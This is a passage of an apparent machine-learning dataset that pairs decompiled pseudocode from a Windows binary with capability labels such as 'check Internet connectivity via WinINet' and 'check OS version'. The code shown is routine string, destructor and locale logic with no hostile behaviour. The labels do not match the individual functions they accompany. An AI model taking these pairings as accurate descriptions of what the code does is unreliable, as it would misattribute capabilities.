uVar6;\n            *(arg1 + 0x52) = uVar7;\n            *(arg1 + 0x56) = uVar8;\n            uVar6 = puVar5[5];\n            uVar7 = puVar5[6];\n            uVar8 = puVar5[7];\n            *(arg1 + 0x5a) = puVar5[4];\n            *(arg1 + 0x5e) = uVar6;\n            *(arg1 + 0x62) = uVar7;\n            *(arg1 + 0x66) = uVar8;\n            *(arg1 + 0x6a) = puVar5[8];\n        }\n        else {\n            (**(*piVar11 + 0x38))(piVar11, puVar5, puVar5 + 9, arg1 + 0x4a);\n        }\n    }\n    puVar5 = **0x140102b90;\n    if (*(piVar11 + 7) == '\\x01') {\n        uVar6 = puVar5[1];\n        uVar7 = puVar5[2];\n        uVar8 = puVar5[3];\n        *(arg1 + 0x6e) = *puVar5;\n        *(arg1 + 0x72) = uVar6;\n        *(arg1 + 0x76) = uVar7;\n        *(arg1 + 0x7a) = uVar8;\n        uVar6 = *(puVar5 + 0xe);\n        uVar7 = *(puVar5 + 0x12);\n        uVar8 = *(puVar5 + 0x16);\n        *(arg1 + 0x78) = *(puVar5 + 10);\n        *(arg1 + 0x7c) = uVar6;\n        *(arg1 + 0x80) = uVar7;\n        *(arg1 + 0x84) = uVar8;\n    }\n    else {\n        if (*(piVar11 + 7) == '\\0') {\n            fcn.140025400(piVar11);\n        }\n        if (*(*piVar11 + 0x38) == 0x140025bc0) {\n            uVar6 = puVar5[1];\n            uVar7 = puVar5[2];\n            uVar8 = puVar5[3];\n            *(arg1 + 0x6e) = *puVar5;\n            *(arg1 + 0x72) = uVar6;\n            *(arg1 + 0x76) = uVar7;\n            *(arg1 + 0x7a) = uVar8;\n            uVar6 = *(puVar5 + 0xe);\n            uVar7 = *(puVar5 + 0x12);\n            uVar8 = *(puVar5 + 0x16);\n            *(arg1 + 0x78) = *(puVar5 + 10);\n            *(arg1 + 0x7c) = uVar6;\n            *(arg1 + 0x80) = uVar7;\n            *(arg1 + 0x84) = uVar8;\n        }\n        else {\n            (**(*piVar11 + 0x38))(piVar11, puVar5, puVar5 + 0x1a, arg1 + 0x6e);\n        }\n    }\n    *(arg1 + 0x10) = arg2_00;\n    *(arg1 + 0x28) = uVar12;\n    *(arg1 + 0x38) = uVar13;\n    *(arg1 + 0x88) = 1;\n    piVar2 = *0x140102a70;\n    if (**0x140102a70 == 0) {\n        iVar3 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.140075f90(aiStack80[0] + -0x18);\n        iVar3 = *piVar2;\n    }\n    else {\n        iVar3 = *piVar2;\n    }\n    if (iVar3 == 0) {\n        iVar3 = *(iStack88 + -8);\n        *(iStack88 + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack88 + -8;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.140075f90(iStack88 + -0x18);\n        iVar3 = *piVar2;\n    }\n    else {\n        iVar3 = *piVar2;\n    }\n    if (iVar3 == 0) {\n        iVar3 = *(iStack96 + -8);\n        *(iStack96 + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar2 = iStack96 + -8;\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.140075f90(iStack96 + -0x18, aiStack80);\n    }\n    return;\n}\n",
        "token_count": 2619
    },
    "140097e9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140097e90(ulong *arg1)\n\n{\n    *arg1 = 0x14010b3c0;\n    if (*(arg1 + 0x11) != '\\0') {\n        if (arg1[2] != 0) {\n            fcn.1400b64c0();\n        }\n        if (arg1[5] != 0) {\n            fcn.1400b64c0();\n        }\n        if (arg1[7] != 0) {\n            fcn.1400b64c0();\n        }\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "140097f5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00014009833c)\n\nvoid fcn.140097f50(int64_t arg1, ulong arg2)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    int64_t arg1_00;\n    bool bVar5;\n    ushort uVar6;\n    int64_t *piVar7;\n    char *arg2_00;\n    ulong uVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    int64_t iStack80;\n    int64_t iStack72;\n    int64_t iStack64;\n    \n    piVar7 = fcn.1400b3b80(arg2);\n    if (*(*piVar7 + 0x20) == 0x14005b340) {\n        iVar9 = -1;\n        iVar10 = *(piVar7[2] + 0x10);\n        if (iVar10 != 0) {\n            iVar9 = sub.msvcrt.dll_strlen(iVar10);\n            iVar9 = iVar10 + iVar9;\n        }\n        iStack80 = fcn.140075b60(iVar10, iVar9);\n    }\n    else {\n        (**(*piVar7 + 0x20))(&iStack80, piVar7);\n    }\n    uVar8 = *(iStack80 + -0x18);\n    *(arg1 + 0x18) = uVar8;\n    arg2_00 = fcn.1400b64f0(uVar8);\n    fcn.14001efe0(&iStack80, arg2_00, *(arg1 + 0x18), 0);\n    bVar5 = false;\n    if (*(arg1 + 0x18) != 0) {\n        bVar5 = *arg2_00 - 1U < 0x7e;\n    }\n    *(arg1 + 0x20) = bVar5;\n    if (*(*piVar7 + 0x28) == 0x14005b390) {\n        iVar9 = -2;\n        iVar10 = *(piVar7[2] + 0x28);\n        if (iVar10 != 0) {\n            iVar9 = sub.msvcrt.dll_wcslen(iVar10);\n            iVar9 = iVar10 + iVar9 * 2;\n        }\n        iStack72 = fcn.14006c650(iVar10, iVar9);\n    }\n    else {\n        (**(*piVar7 + 0x28))(&iStack72, piVar7);\n    }\n    uVar4 = *(iStack72 + -0x18);\n    *(arg1 + 0x30) = uVar4;\n    if (0x3ffffffffffffffc < uVar4) {\n        uVar8 = fcn.1400b7660();\n        iVar9 = 0;\n        goto code_r0x000140098302;\n    }\n    iVar9 = fcn.1400b64f0(uVar4 * 2);\n    fcn.14001df50(&iStack72, iVar9, *(arg1 + 0x30), 0);\n    if (*(*piVar7 + 0x30) == 0x14005b3e0) {\n        iVar10 = -2;\n        arg1_00 = *(piVar7[2] + 0x38);\n        if (arg1_00 != 0) {\n            iVar10 = sub.msvcrt.dll_wcslen(arg1_00);\n            iVar10 = arg1_00 + iVar10 * 2;\n        }\n        iStack64 = fcn.14006c650(arg1_00, iVar10);\n    }\n    else {\n        (**(*piVar7 + 0x30))(&iStack64, piVar7);\n    }\n    uVar4 = *(iStack64 + -0x18);\n    *(arg1 + 0x40) = uVar4;\n    if (0x3ffffffffffffffc < uVar4) {\n        uVar8 = fcn.1400b7660();\n        do {\n            fcn.14006caa0(iStack72 + -0x18);\ncode_r0x000140098302:\n            fcn.140075fa0(iStack80 + -0x18);\n            fcn.1400b6670(uVar8);\n            if (arg2_00 != NULL) {\n                fcn.1400b64c0(arg2_00);\n            }\n            if (iVar9 != 0) {\n                fcn.1400b64c0(iVar9);\n            }\n            uVar8 = fcn.1400b6b70();\n        } while( true );\n    }\n    uVar8 = fcn.1400b64f0(uVar4 * 2);\n    fcn.14001df50(&iStack64, uVar8, *(arg1 + 0x40), 0);\n    iVar10 = *piVar7;\n    if (*(iVar10 + 0x10) == 0x14005b490) {\n        uVar6 = *(piVar7[2] + 0x48);\n    }\n    else {\n        uVar6 = (**(iVar10 + 0x10))(piVar7);\n        iVar10 = *piVar7;\n    }\n    *(arg1 + 0x48) = uVar6;\n    if (*(iVar10 + 0x18) == 0x14005b4a0) {\n        uVar6 = *(piVar7[2] + 0x4a);\n    }\n    else {\n        uVar6 = (**(iVar10 + 0x18))(piVar7);\n    }\n    *(arg1 + 0x4a) = uVar6;\n    piVar7 = fcn.1400b3700(arg2);\n    (**(*piVar7 + 0x58))(piVar7, **0x140102ba0, **0x140102ba0 + 0x24, arg1 + 0x4c);\n    (**(*piVar7 + 0x58))(piVar7, **0x140102b90, **0x140102b90 + 0x1a, arg1 + 0x94);\n    *(arg1 + 0x10) = arg2_00;\n    *(arg1 + 0x28) = iVar9;\n    *(arg1 + 0x38) = uVar8;\n    *(arg1 + 200) = 1;\n    piVar1 = *0x140102a70;\n    if (**0x140102a70 == 0) {\n        iVar3 = *(iStack64 + -8);\n        *(iStack64 + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar2 = iStack64 + -8;\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.14006ca90(iStack64 + -0x18);\n    }\n    if (*piVar1 == 0) {\n        iVar3 = *(iStack72 + -8);\n        *(iStack72 + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar2 = iStack72 + -8;\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.14006ca90(iStack72 + -0x18);\n    }\n    if (*piVar1 == 0) {\n        iVar3 = *(iStack80 + -8);\n        *(iStack80 + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack80 + -8;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar3) {\n        return;\n    }\n    fcn.140075f90(iStack80 + -0x18, &iStack64);\n    return;\n}\n",
        "token_count": 1805
    },
    "1400984c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400984c0(ulong *arg1)\n\n{\n    *arg1 = 0x14010b3e0;\n    if (*(arg1 + 0x19) != '\\0') {\n        if (arg1[2] != 0) {\n            fcn.1400b64c0();\n        }\n        if (arg1[5] != 0) {\n            fcn.1400b64c0();\n        }\n        if (arg1[7] != 0) {\n            fcn.1400b64c0();\n        }\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "140099da": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.140099da0(int64_t arg1, ulong arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    ulong arg1_00;\n    ulong arg1_01;\n    ulong arg1_02;\n    ulong *puVar4;\n    bool bVar5;\n    uchar uVar6;\n    uint uVar7;\n    int64_t *piVar8;\n    ulong arg2_00;\n    ulong arg2_01;\n    ulong arg2_02;\n    char *arg2_03;\n    int64_t iVar9;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piVar8 = fcn.1400b3460(arg2);\n    if (*(*piVar8 + 0x28) == 0x14001fb30) {\n        iVar9 = -1;\n        iVar3 = *(piVar8[2] + 0x28);\n        if (iVar3 != 0) {\n            iVar9 = sub.msvcrt.dll_strlen(iVar3);\n            iVar9 = iVar3 + iVar9;\n        }\n        aiStack80[0] = fcn.140075ae0(iVar3, iVar9);\n    }\n    else {\n        (**(*piVar8 + 0x28))(aiStack80, piVar8);\n    }\n    arg1_00 = *(aiStack80[0] + -0x18);\n    arg2_00 = fcn.1400b64f0(arg1_00);\n    fcn.14001efe0(aiStack80, arg2_00, arg1_00, 0);\n    if (**0x140102a70 == 0) {\n        iVar2 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.140075f90(aiStack80[0] + -0x18, &uStack81);\n    }\n    if (*(*piVar8 + 0x30) == 0x14001fbf0) {\n        iVar9 = -1;\n        iVar3 = *(piVar8[2] + 0x38);\n        if (iVar3 != 0) {\n            iVar9 = sub.msvcrt.dll_strlen(iVar3);\n            iVar9 = iVar3 + iVar9;\n        }\n        aiStack80[0] = fcn.140075ae0(iVar3, iVar9);\n    }\n    else {\n        (**(*piVar8 + 0x30))(aiStack80, piVar8);\n    }\n    arg1_01 = *(aiStack80[0] + -0x18);\n    arg2_01 = fcn.1400b64f0(arg1_01);\n    fcn.14001efe0(aiStack80, arg2_01, arg1_01, 0);\n    if (**0x140102a70 == 0) {\n        iVar2 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.140075f90(aiStack80[0] + -0x18, &uStack81);\n    }\n    if (*(*piVar8 + 0x38) == 0x14001fba0) {\n        iVar9 = -1;\n        iVar3 = *(piVar8[2] + 0x48);\n        if (iVar3 != 0) {\n            iVar9 = sub.msvcrt.dll_strlen(iVar3);\n            iVar9 = iVar3 + iVar9;\n        }\n        aiStack80[0] = fcn.140075ae0(iVar3, iVar9);\n    }\n    else {\n        (**(*piVar8 + 0x38))(aiStack80, piVar8);\n    }\n    arg1_02 = *(aiStack80[0] + -0x18);\n    arg2_02 = fcn.1400b64f0(arg1_02);\n    fcn.14001efe0(aiStack80, arg2_02, arg1_02, 0);\n    if (**0x140102a70 == 0) {\n        iVar2 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.140075f90(aiStack80[0] + -0x18, &uStack81);\n    }\n    if (*(*piVar8 + 0x20) == 0x14001f950) {\n        iVar9 = -1;\n        iVar3 = *(piVar8[2] + 0x10);\n        if (iVar3 != 0) {\n            iVar9 = sub.msvcrt.dll_strlen(iVar3);\n            iVar9 = iVar3 + iVar9;\n        }\n        aiStack80[0] = fcn.140075ae0(iVar3, iVar9);\n    }\n    else {\n        (**(*piVar8 + 0x20))(aiStack80, piVar8);\n    }\n    iVar9 = *(aiStack80[0] + -0x18);\n    arg2_03 = fcn.1400b64f0(iVar9);\n    fcn.14001efe0(aiStack80, arg2_03, iVar9, 0);\n    *(arg1 + 0x10) = arg2_03;\n    bVar5 = false;\n    *(arg1 + 0x18) = iVar9;\n    if (iVar9 != 0) {\n        bVar5 = *arg2_03 - 1U < 0x7e;\n    }\n    *(arg1 + 0x20) = bVar5;\n    if (*(*piVar8 + 0x10) == 0x14001fb90) {\n        uVar6 = *(piVar8[2] + 0x21);\n    }\n    else {\n        uVar6 = (**(*piVar8 + 0x10))(piVar8);\n    }\n    *(arg1 + 0x21) = uVar6;\n    if (*(*piVar8 + 0x18) == 0x14001fc40) {\n        uVar6 = *(piVar8[2] + 0x22);\n    }\n    else {\n        uVar6 = (**(*piVar8 + 0x18))(piVar8);\n    }\n    *(arg1 + 0x22) = uVar6;\n    iVar9 = *piVar8;\n    *(arg1 + 0x30) = arg1_00;\n    *(arg1 + 0x28) = arg2_00;\n    *(arg1 + 0x40) = arg1_01;\n    *(arg1 + 0x38) = arg2_01;\n    *(arg1 + 0x50) = arg1_02;\n    *(arg1 + 0x48) = arg2_02;\n    if (*(iVar9 + 0x40) == 0x14001fb80) {\n        uVar7 = *(piVar8[2] + 0x58);\n    }\n    else {\n        uVar7 = (**(iVar9 + 0x40))(piVar8);\n        iVar9 = *piVar8;\n    }\n    *(arg1 + 0x58) = uVar7;\n    if (*(iVar9 + 0x48) == 0x14001fa10) {\n        uVar7 = *(piVar8[2] + 0x5c);\n    }\n    else {\n        uVar7 = (**(iVar9 + 0x48))(piVar8);\n    }\n    *(arg1 + 0x5c) = uVar7;\n    if (*(*piVar8 + 0x50) == 0x14001fa00) {\n        uVar7 = *(piVar8[2] + 0x60);\n    }\n    else {\n        uVar7 = (**(*piVar8 + 0x50))(piVar8);\n    }\n    *(arg1 + 0x60) = uVar7;\n    piVar8 = fcn.1400b36a0(arg2);\n    puVar4 = **0x140102bd0;\n    if (*(piVar8 + 7) != '\\x01') {\n        if (*(piVar8 + 7) == '\\0') {\n            fcn.140025400(piVar8);\n        }\n        if (*(*piVar8 + 0x38) != 0x140025bc0) {\n            (**(*piVar8 + 0x38))(piVar8, puVar4, puVar4 + 0xb, arg1 + 100);\n            goto code_r0x00014009a12e;\n        }\n    }\n    *(arg1 + 100) = *puVar4;\n    *(arg1 + 0x6b) = *(puVar4 + 7);\ncode_r0x00014009a12e:\n    piVar1 = *0x140102a70;\n    *(arg1 + 0x6f) = 1;\n    if (*piVar1 == 0) {\n        iVar2 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.140075f90(aiStack80[0] + -0x18, &uStack81);\n    }\n    return;\n}\n",
        "token_count": 2312
    },
    "14009a51": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14009a510(ulong *arg1)\n\n{\n    *arg1 = 0x14010b630;\n    if (*(arg1 + 0x6f) != '\\0') {\n        if (arg1[2] != 0) {\n            fcn.1400b64c0();\n        }\n        if (arg1[5] != 0) {\n            fcn.1400b64c0();\n        }\n        if (arg1[7] != 0) {\n            fcn.1400b64c0();\n        }\n        if (arg1[9] != 0) {\n            fcn.1400b64c0();\n        }\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "14009a5d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.14009a5d0(int64_t arg1, ulong arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    ulong arg1_00;\n    ulong arg1_01;\n    ulong arg1_02;\n    ulong *puVar4;\n    bool bVar5;\n    uchar uVar6;\n    uint uVar7;\n    int64_t *piVar8;\n    ulong arg2_00;\n    ulong arg2_01;\n    ulong arg2_02;\n    char *arg2_03;\n    int64_t iVar9;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piVar8 = fcn.1400b34c0(arg2);\n    if (*(*piVar8 + 0x28) == 0x14001ff70) {\n        iVar9 = -1;\n        iVar3 = *(piVar8[2] + 0x28);\n        if (iVar3 != 0) {\n            iVar9 = sub.msvcrt.dll_strlen(iVar3);\n            iVar9 = iVar3 + iVar9;\n        }\n        aiStack80[0] = fcn.140075ae0(iVar3, iVar9);\n    }\n    else {\n        (**(*piVar8 + 0x28))(aiStack80, piVar8);\n    }\n    arg1_00 = *(aiStack80[0] + -0x18);\n    arg2_00 = fcn.1400b64f0(arg1_00);\n    fcn.14001efe0(aiStack80, arg2_00, arg1_00, 0);\n    if (**0x140102a70 == 0) {\n        iVar2 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.140075f90(aiStack80[0] + -0x18, &uStack81);\n    }\n    if (*(*piVar8 + 0x30) == 0x140020030) {\n        iVar9 = -1;\n        iVar3 = *(piVar8[2] + 0x38);\n        if (iVar3 != 0) {\n            iVar9 = sub.msvcrt.dll_strlen(iVar3);\n            iVar9 = iVar3 + iVar9;\n        }\n        aiStack80[0] = fcn.140075ae0(iVar3, iVar9);\n    }\n    else {\n        (**(*piVar8 + 0x30))(aiStack80, piVar8);\n    }\n    arg1_01 = *(aiStack80[0] + -0x18);\n    arg2_01 = fcn.1400b64f0(arg1_01);\n    fcn.14001efe0(aiStack80, arg2_01, arg1_01, 0);\n    if (**0x140102a70 == 0) {\n        iVar2 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.140075f90(aiStack80[0] + -0x18, &uStack81);\n    }\n    if (*(*piVar8 + 0x38) == 0x14001ffe0) {\n        iVar9 = -1;\n        iVar3 = *(piVar8[2] + 0x48);\n        if (iVar3 != 0) {\n            iVar9 = sub.msvcrt.dll_strlen(iVar3);\n            iVar9 = iVar3 + iVar9;\n        }\n        aiStack80[0] = fcn.140075ae0(iVar3, iVar9);\n    }\n    else {\n        (**(*piVar8 + 0x38))(aiStack80, piVar8);\n    }\n    arg1_02 = *(aiStack80[0] + -0x18);\n    arg2_02 = fcn.1400b64f0(arg1_02);\n    fcn.14001efe0(aiStack80, arg2_02, arg1_02, 0);\n    if (**0x140102a70 == 0) {\n        iVar2 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.140075f90(aiStack80[0] + -0x18, &uStack81);\n    }\n    if (*(*piVar8 + 0x20) == 0x14001fd90) {\n        iVar9 = -1;\n        iVar3 = *(piVar8[2] + 0x10);\n        if (iVar3 != 0) {\n            iVar9 = sub.msvcrt.dll_strlen(iVar3);\n            iVar9 = iVar3 + iVar9;\n        }\n        aiStack80[0] = fcn.140075ae0(iVar3, iVar9);\n    }\n    else {\n        (**(*piVar8 + 0x20))(aiStack80, piVar8);\n    }\n    iVar9 = *(aiStack80[0] + -0x18);\n    arg2_03 = fcn.1400b64f0(iVar9);\n    fcn.14001efe0(aiStack80, arg2_03, iVar9, 0);\n    *(arg1 + 0x10) = arg2_03;\n    bVar5 = false;\n    *(arg1 + 0x18) = iVar9;\n    if (iVar9 != 0) {\n        bVar5 = *arg2_03 - 1U < 0x7e;\n    }\n    *(arg1 + 0x20) = bVar5;\n    if (*(*piVar8 + 0x10) == 0x14001ffd0) {\n        uVar6 = *(piVar8[2] + 0x21);\n    }\n    else {\n        uVar6 = (**(*piVar8 + 0x10))(piVar8);\n    }\n    *(arg1 + 0x21) = uVar6;\n    if (*(*piVar8 + 0x18) == 0x140020080) {\n        uVar6 = *(piVar8[2] + 0x22);\n    }\n    else {\n        uVar6 = (**(*piVar8 + 0x18))(piVar8);\n    }\n    *(arg1 + 0x22) = uVar6;\n    iVar9 = *piVar8;\n    *(arg1 + 0x30) = arg1_00;\n    *(arg1 + 0x28) = arg2_00;\n    *(arg1 + 0x40) = arg1_01;\n    *(arg1 + 0x38) = arg2_01;\n    *(arg1 + 0x50) = arg1_02;\n    *(arg1 + 0x48) = arg2_02;\n    if (*(iVar9 + 0x40) == 0x14001ffc0) {\n        uVar7 = *(piVar8[2] + 0x58);\n    }\n    else {\n        uVar7 = (**(iVar9 + 0x40))(piVar8);\n        iVar9 = *piVar8;\n    }\n    *(arg1 + 0x58) = uVar7;\n    if (*(iVar9 + 0x48) == 0x14001fe50) {\n        uVar7 = *(piVar8[2] + 0x5c);\n    }\n    else {\n        uVar7 = (**(iVar9 + 0x48))(piVar8);\n    }\n    *(arg1 + 0x5c) = uVar7;\n    if (*(*piVar8 + 0x50) == 0x14001fe40) {\n        uVar7 = *(piVar8[2] + 0x60);\n    }\n    else {\n        uVar7 = (**(*piVar8 + 0x50))(piVar8);\n    }\n    *(arg1 + 0x60) = uVar7;\n    piVar8 = fcn.1400b36a0(arg2);\n    puVar4 = **0x140102bd0;\n    if (*(piVar8 + 7) != '\\x01') {\n        if (*(piVar8 + 7) == '\\0') {\n            fcn.140025400(piVar8);\n        }\n        if (*(*piVar8 + 0x38) != 0x140025bc0) {\n            (**(*piVar8 + 0x38))(piVar8, puVar4, puVar4 + 0xb, arg1 + 100);\n            goto code_r0x00014009a95e;\n        }\n    }\n    *(arg1 + 100) = *puVar4;\n    *(arg1 + 0x6b) = *(puVar4 + 7);\ncode_r0x00014009a95e:\n    piVar1 = *0x140102a70;\n    *(arg1 + 0x6f) = 1;\n    if (*piVar1 == 0) {\n        iVar2 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.140075f90(aiStack80[0] + -0x18, &uStack81);\n    }\n    return;\n}\n",
        "token_count": 2311
    },
    "14009ad4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14009ad40(ulong *arg1)\n\n{\n    *arg1 = 0x14010b650;\n    if (*(arg1 + 0x6f) != '\\0') {\n        if (arg1[2] != 0) {\n            fcn.1400b64c0();\n        }\n        if (arg1[5] != 0) {\n            fcn.1400b64c0();\n        }\n        if (arg1[7] != 0) {\n            fcn.1400b64c0();\n        }\n        if (arg1[9] != 0) {\n            fcn.1400b64c0();\n        }\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "14009b56": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14009b560(ulong *arg1)\n\n{\n    *arg1 = 0x14010b670;\n    if (*(arg1 + 0x7a) != '\\0') {\n        if (arg1[2] != 0) {\n            fcn.1400b64c0();\n        }\n        if (arg1[5] != 0) {\n            fcn.1400b64c0();\n        }\n        if (arg1[7] != 0) {\n            fcn.1400b64c0();\n        }\n        if (arg1[9] != 0) {\n            fcn.1400b64c0();\n        }\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "14009bd8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14009bd80(ulong *arg1)\n\n{\n    *arg1 = 0x14010b690;\n    if (*(arg1 + 0x7a) != '\\0') {\n        if (arg1[2] != 0) {\n            fcn.1400b64c0();\n        }\n        if (arg1[5] != 0) {\n            fcn.1400b64c0();\n        }\n        if (arg1[7] != 0) {\n            fcn.1400b64c0();\n        }\n        if (arg1[9] != 0) {\n            fcn.1400b64c0();\n        }\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "14009c14": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14009c140(int64_t arg1, ulong arg2, char *arg3, char *arg4)\n\n{\n    char cVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int64_t *arg1_00;\n    char *pcVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    char *pcVar7;\n    int64_t in_stack_00000028;\n    int64_t in_stack_00000030;\n    \n    uVar3 = *(arg1 + 0x18) & 0xb0;\n    iVar5 = in_stack_00000028 - in_stack_00000030;\n    if (uVar3 == 0x20) {\n        if (in_stack_00000030 != 0) {\n            sub.msvcrt.dll_memcpy(arg3, arg4, in_stack_00000030);\n        }\n        if (iVar5 == 0) {\n            return;\n        }\n    // WARNING: Could not recover jumptable at 0x000140018640. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.msvcrt.dll_memset)(arg3 + in_stack_00000030, arg2, iVar5);\n        return;\n    }\n    pcVar4 = arg3;\n    pcVar7 = arg4;\n    if (uVar3 == 0x10) {\n        arg1_00 = fcn.1400b36a0(arg1 + 0xd0);\n        if (*(arg1_00 + 7) == '\\0') {\n            fcn.140025400(arg1_00);\n            cVar2 = '-';\n            if (*(*arg1_00 + 0x30) != 0x140025bf0) {\n                cVar2 = (**(*arg1_00 + 0x30))(arg1_00);\n            }\n            cVar1 = *arg4;\n            if (cVar1 != cVar2) {\n                if (*(arg1_00 + 7) != '\\0') goto code_r0x00014009c254;\n                fcn.140025400(arg1_00);\n                cVar2 = '+';\n                if (*(*arg1_00 + 0x30) != 0x140025bf0) {\n                    cVar2 = 